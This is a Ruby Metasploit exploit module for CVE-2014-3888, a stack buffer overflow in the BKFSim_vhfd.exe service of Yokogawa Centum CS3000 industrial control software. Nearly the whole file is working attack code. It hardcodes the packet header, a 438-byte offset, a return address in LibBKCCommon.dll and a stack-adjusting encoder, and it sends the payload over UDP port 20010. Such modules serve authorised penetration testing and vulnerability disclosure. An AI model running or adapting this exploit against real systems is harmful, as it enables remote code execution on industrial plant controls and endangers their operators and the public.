##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Udp

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Yokogawa CS3000 BKFSim_vhfd.exe Buffer Overflow',
      'Description' => %q{
This module exploits an stack based buffer overflow on Yokogawa CS3000. The vulnerability
exists in the service BKFSim_vhfd.exe when using malicious user-controlled data to create
logs using functions like vsprintf and memcpy in a insecure way. This module has been
tested successfully on Yokogawa Centum CS3000 R3.08.50 over Windows XP SP3.
},
      'Author' =>
        [
          'Redsadic <julian.vilas[at]gmail.com>',
          'juan vazquez'
        ],
      'References' =>
        [
          ['CVE', '2014-3888'],
          ['URL', 'http://jvn.jp/vu/JVNVU95045914/index.html'],
          ['URL', 'http://www.yokogawa.com/dcs/security/ysar/YSAR-14-0002E.pdf'],
          ['URL', 'https://community.rapid7.com/community/metasploit/blog/2014/07/07/r7-2014-06-disclosure-yokogawa-centum-cs-3000-bkfsimvhfdexe-buffer-overflow']
        ],
      'Payload' =>
        {
          'Space' => 1770, # 2228 (max packet length) - 16 (header) - (438 target['Offset']) - 4 (ret)
          'DisableNops' => true,
          'BadChars' => "\x00",
          'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
        },
      'Platform' => 'win',
      'Targets' =>
        [
          [ 'Yokogawa Centum CS3000 R3.08.50 / Windows XP SP3',
            {
              'Ret' => 0x61e55c9c, # push esp | ret # LibBKCCommon.dll
              'Offset' => 438
            }
          ],
        ],
      'DisclosureDate' => 'May 23 2014',
      'DefaultTarget' => 0))

    register_options(
      [
        Opt::RPORT(20010)
      ], self.class)
  end

  def exploit
    connect_udp

    sploit = "\x45\x54\x56\x48\x01\x01\x10\x09\x00\x00\x00\x01\x00\x00\x00\x44" # header
    sploit << rand_text(target['Offset'])
    sploit << [target.ret].pack("V")
    sploit << payload.encoded

    print_status("Trying target #{target.name}, sending #{sploit.length} bytes...")
    udp_sock.put(sploit)

    disconnect_udp
  end

end
